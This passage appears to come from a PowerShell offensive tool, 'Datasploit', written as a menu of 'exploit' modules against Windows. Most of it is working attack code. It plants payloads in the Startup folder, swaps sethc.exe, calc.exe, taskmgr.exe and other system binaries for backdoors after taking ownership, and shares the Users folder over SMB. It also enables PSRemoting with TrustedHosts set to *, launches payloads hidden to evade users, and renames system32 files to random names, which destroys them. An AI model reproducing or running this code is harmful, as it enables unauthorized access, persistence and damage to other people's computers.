			    write-host "PAYLOAD REQUIRED:"
			    write-host
			    write-host "Any"
			    write-host
			    write-host "CURRENT PAYLOAD:"
			    write-host
			    write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear			
			}
		}	
	}
	elseif ($input -eq "use/cve-startup-inject/exploit") {
		clear
		while (1 -eq 1) {
			$paa=read-host "use/cve-startup/exploit:"
			if ($paa -eq "exploit") {
				write-host "Injecting payload:" $payload "into Startup menu"
				sleep -s 3
				$username=read-host "set username:"
				copy-item exploit_scripts\payloads\$payload "C:\users\$username\Appdata\roaming\microsoft\windows\start menu\programs\startup"
				write-host "Injection attack completed" -foregroundcolor red
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
            elseif ($paa -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($oaa -eq "set payload") {
                payloads
            }
			elseif ($paa -eq "exit") {
				clear
				break
			}
			else {
                write-host "Nul Error identified:" $paa "Commands: (exploit, show payload, set payload, exit) expected. Command received:" $paa
			    write-host
			    write-host "Exploit Options:"
			    write-host
			    write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			    write-host "====================================================================="
			    write-host
			    write-host "use/cve-startup/exploit         Omeo         Excellent  Windows7-10"
			    write-host
			    write-host "DESCRIPTION:"
			    write-host "This module injects a malicious payload into the specified "
				write-host "user startup folder"
                Write-Host
			    write-host "PAYLOAD REQUIRED:"
			    write-host
			    write-host "Any"
			    write-host
			    write-host "CURRENT PAYLOAD:"
			    write-host
			    write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
		}
		
	}
	elseif ($input -eq "use/inject/wifi") {
	    clear
		while (1 -eq 1) {
		    $hi=read-host "use/inject/wifi:"
			if ($hi -eq "exploit") {
				write-host "Making use of" $payload "as payload"
				sleep -s 1
			    write-host "Starting Injection.........." -foregroundcolor red
				sleep -s 1
				write-host "Copying payload to target computer" -foregroundcolor $gcolor
				copy-item exploit_scripts\payloads\$payload "C:\windows\system32"
				sleep -s 2
				write-host "Executing payload"
				start C:\windows\system32\netsvc.bat
                New-SmbShare -Name Datasploit_hacked -Path C:\Users\
				$ip_address=read-host "Enter ip address to set for the target (eg. 192.168.43.66):"
				write-host "Target ip address set to:" $ip_address
				netsh interface ipv4 set address name="Local Area connection" static $ip_address 255.255.255.0 192.168.43.1
				write-host "Exploit completed"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
			elseif ($hi -eq "exit") {
				clear
				break
			}
			else {
				write-host "Nul Error identified:" $hi
				write-host "#Title: use/netsvc/exploit"
				write-host "#Author: Omeo"
				write-host "#Date: 26th December 2016"
				write-host "#info: This module injects the netsvc payload into the target "
				write-host "computer, enabling the file and printer sharing, and network"
				write-host "discovery. It also sets a static ip address for the computer."
				write-host "This exploit also shares the users folder, giving the attacker access"
                write-host "to the computer from his/her own"
                write-host "Type in exploit to launch attack."
				write-host "Requires use of payload: netsvc"
				write-host "Rank: Great"
				write-host "OS Level: Windows 7-10"
				write-host "Current Payload:" $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
		}
	}
	elseif ($input -eq "use/cmd/bgn3-3") {
		write-host "Spawning shell.........."
		sleep -s 2 
		start cmd
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($input -eq "use/start_hidden/exploit") {
		clear
		while (1 -eq 1) {
			$pa=read-host "use/start_hidden/exploit:"
			if ($pa -eq "exploit") {
				write-host "Starting payload in background process"
				sleep -s 1
				write-host "You can still stop this by pressing Ctrl+c"
				sleep -s 1
				start-process .\exploit_scripts\payloads\$payload -WindowStyle Hidden
				sleep -s 2
				write-host "Payload injected into processes"
                Write-Host "you can view this process by closing Datasploit and checking taskmanager"
                Write-Host "or opening powershell and typing 'ps'"
				Get-Process|Select-String $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
            elseif ($pa -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($pa -eq "set payload") {
                payloads
            }
			elseif ($pa -eq "exit") {
				clear
				break			
			}
			else {
				write-host "Nul Error identified:" $pa "Commands: (exploit, show payload, set payload, exit,) expected. Command received:" $pa
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                AUTHOR           RANK       OS LEVEL"        
				write-host "========================================================"
				write-host
				write-host "use/start_hidden     Omeo            Excellent  Windows7-10"
				write-host
				write-host "DESCRIPTION:"
				write-host
				Write-Host "This modules attempts to start the specified payload in a process hidden"
                Write-Host "from the user. May be useful for launching undectable viruses."
				write-host
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "ANY"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear			
			}
		}
	}
	elseif ($input -eq "use/wifi/broadcast") {
		clear
		while (1 -eq 1) {
			$paa=read-host "use/wifi/broadcast"
			if ($paa -eq "exploit") {
				write-host "Setting up exploit....................."
				sleep -s 1
				write-host "Ignoring payload if it's not inject_netsvc"
				sleep -s 1
				write-host "Starting Broadcast............." -foregroundcolor blue
				sleep -s 2
				$pi=$env:USERNAME
				copy-item exploit_scripts\payloads\$payload "C:\windows\system32"
				sleep -s 3
				copy-item exploit_scripts\ownership\inject_netsvc.bat "C:\users\$pi\Appdata\roaming\microsoft\windows\start menu\programs\startup"
				start "C:\windows\system32\$payload"
				write-host "Injecting packet..............." -foregroundcolor $ycolor1
				write-host "ip_address for target system set as:" 
				ipconfig|select-string "ipv4"
				write-host "you should set yours to something similar."
				sleep -s 1
				write-host "Completing injection..........."
				sleep -s 2
                Write-Host "Sharing the users folder......"
                sleep -s 1
                New-SmbShare -Name Datasploit_hacked C:\users\
				write-host "Injection attack completed" -foregroundcolor red
				write-host "the hotspot password is 'datasploit'"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
            elseif ($paa -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($paa -eq "set payload") {
                payloads
            }
			elseif ($paa -eq "exit") {
				clear
				break
			}
			else {
				write-host "Nul Error identified:" $paa "Commands: (exploit, show payloads, set payload, exit,) expected. Command received:" $paa
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                AUTHOR           RANK       OS LEVEL"        
				write-host "========================================================"
				write-host
				write-host "use/wifi/broadcast   Omeo            Great      Windows8-10"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "This exploit injects the 'inject_netsvc payload into the target's"
				write-host "Computer, enabling the file and printer sharing service, and the"
				write-host "Network Discovery service. It also enables the hotspot service,"
				write-host "allowing users to connect to the computer"
				write-host "This exploit also shares the users folder, giving the attacker access"
                write-host "to the computer from his/her own"
                Write-Host ""
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "use/inject_netsvc/payload"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
		
		}
	
	}
	elseif ($input -eq "use/quick-break/exploit") {
		write-host "Deleting password......................." -foregroundcolor $gcolor
		sleep -s 2
		write-host "Done."
		.\exploit_scripts\payloads\breaker.exe
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($input -eq "use/kill_sec/exploit") {
		clear
		while (1 -eq 1) {
		    $cve=read-host "use/kill_sec/exploit:"
		    if ($cve -eq "exploit") {
			    write-host "Taking ownership of sethc using brute force..............."
				sleep -s 3
				write-host "Making use of" $payload "payload"
				sleep -s 2
				takeown /A /F C:\windows\system32\sethc.exe
				.\exploit_scripts\ownership\password_cracker.bat
				write-host "Brute force successful"
				write-host "Injecting Backdoor file. This may take a while..............."
				move-item -path C:\windows\system32\sethc.exe C:\users
				copy-item exploit_scripts\payloads\$payload -destination C:\windows\system32
				rename-item -path c:\windows\system32\$payload -newname C:\windows\system32\sethc.exe
				write-host "Injection attack completed successfully"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
            elseif ($cve -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($cve -eq "set payload") {
                payloads
            }			
			elseif ($cve -eq "exit") {
				clear
				break
			}
			else {	
				write-host "Nul Error identified:" $cve "Commands: (exploit, show payloads, set payload, exit) expected. Command received:" $cve
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                AUTHOR           RANK       OS LEVEL"        
				write-host "========================================================"
				write-host
				write-host "Kill_Sec            Omeo            Excellent   All Windows"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "This exploit is quite similar to the 'kill_sec/cyb' exploit. It makes use of the sethc vulnerability; injecting"
				write-host "it with a backdoor service that allows you to bypass the cyberclock service when your time expires. Tapping 'shift"
				write-host "5 times should initiate this exploit."
				write-host
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "use/kill_sec/payload"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
		}
	}
	elseif ($input -eq "use/tera-nova/exploit") {
		clear
		while (1 -eq 1) {
		    $cve=read-host "use/tera-nova/exploit:"
		    if ($cve -eq "exploit") {
			    write-host "Taking ownership of DeviceProperties using brute force..............."
				sleep -s 3
				write-host "Making use of" $payload "payload"
				sleep -s 2
				takeown /A /F C:\windows\system32\DeviceProperties.exe
				takeown /A /F C:\windows\system32\DeviceEject.exe
				takeown /A /F C:\windows\system32\calc.exe
				takeown /A /F C:\windows\system32\taskmgr.exe
				.\exploit_scripts\ownership\DeviceProperties.bat
				.\exploit_scripts\ownership\DeviceEject.bat
				.\exploit_scripts\ownership\calc.bat
				.\exploit_scripts\ownership\taskmgr.bat
				write-host "Brute force successful"
				write-host "Injecting Backdoor file. This may take a while..............."
				move-item -path C:\windows\system32\DeviceProperties.exe C:\users
				copy-item exploit_scripts\payloads\$payload -destination C:\windows\system32
				rename-item -path c:\windows\system32\$payload -newname C:\windows\system32\DeviceProperties.exe
				move-item -path C:\windows\system32\DeviceEject.exe C:\users
				copy-item exploit_scripts\payloads\$payload -destination C:\windows\system32
				rename-item -path c:\windows\system32\$payload -newname C:\windows\system32\DeviceEject.exe
				move-item -path C:\windows\system32\calc.exe C:\users
				copy-item exploit_scripts\payloads\$payload -destination C:\windows\system32
				rename-item -path c:\windows\system32\$payload -newname C:\windows\system32\calc.exe
				move-item -path C:\windows\system32\taskmgr.exe C:\users
				copy-item exploit_scripts\payloads\$payload -destination C:\windows\system32
				rename-item -path c:\windows\system32\$payload -newname C:\windows\system32\taskmgr.exe
				write-host "Injection attack completed successfully"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
            elseif ($cve -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($cve -eq "set payload") {
                payloads
            }			
			elseif ($cve -eq "exit") {
				clear
				break
			}
			else {	
				write-host "Nul Error identified:" $cve "Commands: (exploit, show payloads, set payload, exit) expected. Command received:" $cve
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                AUTHOR           RANK       OS LEVEL"        
				write-host "========================================================"
				write-host
				write-host "Tera-Nova            Omeo            Dangerous  All Windows"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "Tera-Nova attempts to take over a small list of useful applications, replacing"
				write-host "them with a specified payload. If the user attempts to launch the infected application"
				write-host "the payload gets launched instead. This exploit can be launched by typing in 'exploit'"
				write-host ""
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "Any"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				write-host
				write-host "FILES INFECTED:"
				write-host
				write-host "DeviceProperties,    DEVICE-EJECT,     CALCULATOR,    TASK-MANAGER"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
		}
	}
	elseif ($input -eq "use/enable-psremote/exploit") {
		clear
		while (1 -eq 1) {
			$sigh=read-host "use/enable-psremote/exploit:"
			if ($sigh -eq "exploit") {
				write-host "Attempting to enable Windows Remote service................"
				sleep -s 3
				Enable-Psremoting -SkipNetworkProfileCheck -force
				write-host "Psremoting enabled. Infiltration Successful"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
			elseif ($sigh -eq "exit") {
				clear
				break
			}
			else {
				write-host "Nul Error identified:" $sigh "Commands: (exploit, exit) expected. Command received:" $sigh
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
				write-host "====================================================================="
				write-host
				write-host "use/enable-psremote/exploit     Omeo         Amazing    All Windows"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "This module simply turns on the built in Psremote tool on the target"
				write-host "computer. Creating an opportunity for the attacker to connect to it"
				write-host "from his/her own computer. Connection is established using the"
				write-host "use/connect_remote/exploit module."
				write-host
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "None"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear	  
			}
		}
	}
	elseif ($input -eq "use/connect_remote/exploit") {
		clear
		while (1 -eq 1) {
			$sad=read-host "use/connect_remote/exploit:"
			if ($sad -eq "exploit") {
				write-host "Attempting to connect to remote host.............."
				sleep -s 2
				$ip_address=read-host "enter computer name:"
				$username=read-host "Account name to authenticate to:"
				write-host "Creating connection to:" $ip_address
				sleep -s 2
				set-item wsman:localhost\client\trustedhosts -value *
				enter-pssession -computername $ip_address -Credential $username
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
            elseif ($sad -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($sad -eq "set payload") {
                payloads
            }
			elseif ($sad -eq "exit") {
				clear
				break
			}
			else {
				write-host "Nul Error identified:" $sad "Commands: (exploit, show payloads, set payload, exit) expected. Command received:" $sad
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
				write-host "====================================================================="
				write-host
				write-host "use/connect_remote/exploit      Omeo         Amazing    All Windows"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "This Module attempts to connect to a ps listener on the target system"
				write-host "created using the enable-psremote/exploit"
				write-host
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "None"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}	
		}
	}
    elseif ($input -eq "use/blot_ware/exploit") {
        clear
        while (1 -eq 1) {
            $blot=read-host "use/blot_ware/exploit"
            if ($blot -eq "exploit") {
                cp .\exploit_scripts\ownership\hufflepuff.bat C:\Windows\System32
                $a=read-host "Extension?"
                cd C:\Windows\System32
                ./hufflepuff.bat
                foreach ($element in Get-ChildItem C:\windows\system32) {
                    if ($element.Extension -eq $a) {
                        $e=get-random 
                        Write-Host "file found:" 
                        write $element
                        Write-Host "Encrypting file............"
                        sleep -s 1
                        takeown /A /F $element
                        Rename-Item $element -NewName $e
                        Write-Host "Files ending with:" $a "have been encrypted"
                    }
                    else {
                        Write-Host
                        write " File:" $element "does not match"
                        write "Skipping........"
                        sleep -s 1
                    }
                }
            }
            elseif ($blot -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($blot -eq "set payload") {
                payloads
            }
            elseif ($blot -eq "exit") {
                clear
                break
            }
            else {
                write-host "Nul Error identified:" $blot "Commands: (exploit, show payloads, set payload, exit) expected. Command received:" $blot
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                           AUTHOR        RANK          OS LEVEL"        
				write-host "====================================================================="
				write-host
				write-host "use/blot_ware/exploit           Omeo         Unforgivable  Windowsxp-10"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "This Module perform a search of all files in C:\windows\system32 ending with the specified extension specified by the user"
                Write-Host "After locating the files, they are all converted into random files, thus becoming in a way, encrypted"
                write-host "By default, only files ending with .exe are taken over; However, this can be changed by editing the 'hufflepuff.bat'"
                Write-Host "script, located at '\exploit_scripts\ownership\hufflepuff.bat'. Extensions should be provided with the '.' preceeding"
                Write-Host "the file type. E.g '.exe', '.dll'"
				write-host "Note once more that this exploit is pretty much the most dangerous of all, and most be handled with care. It has ofcourse"
                Write-Host "been ranked 'unforgivable'"
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "None"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
            }
        }
    }
    elseif ($input -eq "use/ip_enumeration/exploit") {
        clear
        while (1 -eq 1){
            $ipp=Read-Host "use/ip_enumeration/exploit:> "
            if ($ipp -eq "enumerate") {     
                Write-Host "Getting ip addresses from ARP.........." -ForegroundColor $gcolor
                sleep -s 2          
                foreach ($a in Get-NetNeighbor) {
                    if ($a.State -eq "stale" -or $a.State -eq "reachable") {
                        write-host "Address: "$a.IPAddress "is connected" -ForegroundColor $gcolor
                        sleep -s 1   
                    }
                    else {
                        Write-Host
                        write-host "Dormant ip address found: " $a.IPAddress " Skipping........" -ForegroundColor Red
                    }  
                }
            }
            elseif ($ipp -eq "exit") {
                clear
                break
            }
            else {
                write-host "Nul Error identified:" $ipp "Commands: (enumerate, exit) expected. Command received:" $ipp
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                           AUTHOR        RANK          OS LEVEL"        
				write-host "====================================================================="
				write-host
				write-host "use/ip_enumerate                omeo         Excellent     Windows8-10"
				write-host
				write-host "DESCRIPTION:"
				write-host 
                Write-Host "This exploit makes use of the 'Get-netneighbour command on powershell and scans your computer for "
                write-host "Devices currently connected to your network using the Address resolution protocol cache."
                Write-Host "Note that although this exploit is fast, it is usually not that accurate. For greater accuracy,"
                Write-Host "please refer to 'use/ip_enumeration2/exploit'"
				write-host
                Write-Host "PAYLOAD REQUIRED"
                Write-Host 
				write-host "None"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear

            }

        }
 
    }

    elseif ($input -eq "use/ip_enumeration2/exploit") {
        clear
        while (1 -eq 1){
            $ipe=Read-Host "use/ip_enumeration2/exploit:> "
            if ($ipe -eq "enumerate") {     
                $a=0
                $pres=ipconfig|Select-String ipv4
                if ($pres.length -eq 0) {
                    Write-Host "Present ip address is null"
                    Write-Host
                }
                else {
                    Write-Host "Current ip address is: " $pres
                }
                Write-Host
                $subnet=Read-Host "Enter ip subnet to scan for: "
                Write-Host
                Write-Host "Attempting to discover ip adddresses based on: " $subnet " subnet" -ForegroundColor $gcolor
                sleep -s 1
                Write-Host
                $ccount=0
                while ($a -lt 255){
                    $a+=1
                    $b=$subnet+"."+$a
                    $c=ping -n 1 -l 0 -w 1 $b
                    if ($c.count -eq 8) {
                        write-host "Address: " $b " is connected" -ForegroundColor $gcolor
                        write-host
                        $ccount+=1
                    }
                    else {
                        write-host "skipping....: " $b
                        write-host
                    }
                }
                $date=get-date
                Write-Host "Total number of address discovered:" $ccount "Scanning completed at: " $date -ForegroundColor $gcolor
                Write-Host
            }
            elseif ($ipe -eq "exit") {
                clear
                break
            }
            else {
                write-host "Nul Error identified:" $ipe "Commands: (enumerate, exit) expected. Command received:" $ipe
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                           AUTHOR        RANK          OS LEVEL"        
				write-host "====================================================================="
				write-host
				write-host "use/ip_enumerate                omeo         Great     Windows7-10"
				write-host
				write-host "DESCRIPTION:"
				write-host 
                Write-Host "A slower but more accurate version of use/ip_enumeration/exploit, use/ip_enumeration2/exploit scans for ip addresses"
                Write-Host "connected to the same network as your computer using the ping net utility command. Ping requirements including byte size"
                Write-Host "and TTL size are set to the barest minimum in order to increase speed. For subnet size, enter the first 16bits of the ip"
                Write-Host "address. For example, if your ip address comes as '192.168.43.2', enter 192.168.43 as subnet. "
				write-host
                Write-Host "PAYLOAD REQUIRED"
                Write-Host 
				write-host "None"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear

            }

        }
    }
	else {
       write-host "The command" $input "is not understood. Type in show options for usage."
	   $pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
	   clear	   
    }
}	
	
	
	
	
	
	
	
	
	
	
	
	
	